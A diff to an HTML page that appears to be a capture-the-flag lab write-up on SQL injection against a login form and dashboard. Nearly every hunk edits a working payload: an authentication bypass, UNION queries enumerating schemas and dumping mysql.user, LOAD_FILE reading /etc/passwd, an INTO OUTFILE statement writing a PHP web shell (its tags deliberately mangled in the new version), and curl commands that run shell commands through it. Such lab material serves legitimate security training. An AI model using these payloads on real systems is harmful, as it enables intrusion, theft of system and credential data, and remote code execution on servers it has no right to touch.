@@ -68,7 +68,7 @@
 
       <h2 class="text-2xl font-semibold mb-4">Step 3: Testing for SQL Injection</h2>
       <p class="mb-4">
-        A payload using a single quote, a truthy statement and a comment (<code>' OR 1=1-- -</code>) yields a white screen instead of the failed login message. This suggests the query is evaluated as true.
+        A payload using a single quote, a truthy statement and a comment <code>' OR '1'='1'-- -</code> yields a white screen instead of the failed login message. This suggests the query is evaluated as true.
       </p>
       <div class="mb-8">
         <img src="/images/SQL4.png" alt="White screen after injection" class="w-full rounded-lg shadow-md">
@@ -102,7 +102,7 @@
         List available schemas:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, schema_name, 3, 4
+' UNION SELECT 1, schema_name, 3, 4
 FROM information_schema.schemata-- -
       </pre>
       <div class="mb-8">
@@ -112,7 +112,7 @@ FROM information_schema.schemata-- -
         Found <code>mysql</code>. List its tables:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, table_name, table_schema, 4, 5
+' UNION SELECT 1, table_name, table_schema, 4, 5
 FROM information_schema.tables
 WHERE table_schema='mysql'-- -
       </pre>
@@ -125,7 +125,7 @@ WHERE table_schema='mysql'-- -
         Inspect the <code>host</code> table columns:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, column_name, table_name, 4, 5
+' UNION SELECT 1, column_name, table_name, 4, 5
 FROM information_schema.columns
 WHERE table_name='host'-- -
       </pre>
@@ -136,7 +136,7 @@ WHERE table_name='host'-- -
         Inspect the <code>user</code> table for <code>file_priv</code>:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, column_name, table_name, 4, 5
+' UNION SELECT 1, column_name, table_name, 4, 5
 FROM information_schema.columns
 WHERE table_name='user'-- -
       </pre>
@@ -147,7 +147,7 @@ WHERE table_name='user'-- -
         Dump <code>file_priv</code> values:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, file_priv, 3, 4, 5
+' UNION SELECT 1, file_priv, 3, 4, 5
 FROM mysql.user-- -
       </pre>
       <div class="mb-8">
@@ -157,7 +157,7 @@ FROM mysql.user-- -
         Dump username and host:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, user, host, 4, 5
+' UNION SELECT 1, user, host, 4, 5
 FROM mysql.user-- -
       </pre>
       <div class="mb-8">
@@ -167,7 +167,7 @@ FROM mysql.user-- -
         Confirm current user:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, user(), 3, 4, 5-- -
+' UNION SELECT 1, user(), 3, 4, 5-- -
       </pre>
       <div class="mb-8">
         <img src="/images/SQL15.png" alt="Confirm user() returns root@localhost" class="w-full rounded-lg shadow-md">
@@ -178,7 +178,7 @@ UNION SELECT 1, user(), 3, 4, 5-- -
         Read <code>/etc/passwd</code>:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
+' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
       </pre>
       <div class="mb-8">
         <img src="/images/SQL16.png" alt="passwd contents via LOAD_FILE" class="w-full rounded-lg shadow-md">
@@ -189,7 +189,7 @@ UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
         Attempt an OUTFILE injection to write a PHP shell:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-UNION SELECT 1, "<?php echo shell_exec($_REQUEST['cmd']); ?>", 3, 4, 5
+' UNION SELECT 1, "<|?php echo shell_exec($_REQUEST['cmd']); ?|>", 3, 4, 5
 INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
       </pre>
       <div class="mb-8">
@@ -209,8 +209,8 @@ INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
         List root directory contents:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-curl -H "Cookie: session=e5afpn4e1q44plgaap1p06180vh" \
-  "http://94.237.54.192:51501/dashboard/webshell.php?cmd=ls+-a+${HOME:0:1}"
+curl -H "Cookie: session=COOKIEHERE" \
+  "http://TAGETIP:PORT/dashboard/webshell.php?cmd=ls+-a+${HOME:0:1}"
       </pre>
       <div class="mb-8">
         <img src="/images/SQL19.png" alt="cURL listing directories" class="w-full rounded-lg shadow-md">
@@ -219,8 +219,8 @@ curl -H "Cookie: session=e5afpn4e1q44plgaap1p06180vh" \
         Read the flag:
       </p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-curl -H "Cookie: session=e5afpn4e1q44plgaap1p06180vh" \
-  "http://94.237.54.192:51501/dashboard/webshell.php?cmd=cat+${HOME:0:1}flag_cae1dadcd174.txt"
+curl -H "Cookie: session=COOKIEHERE" \
+  "http://TARGETIP:PORT/dashboard/webshell.php?cmd=cat+${HOME:0:1}flag_cae1dadcd174.txt"
       </pre>
       <div class="mb-8">
         <img src="/images/SQL20.png" alt="cURL reading flag file" class="w-full rounded-lg shadow-md">
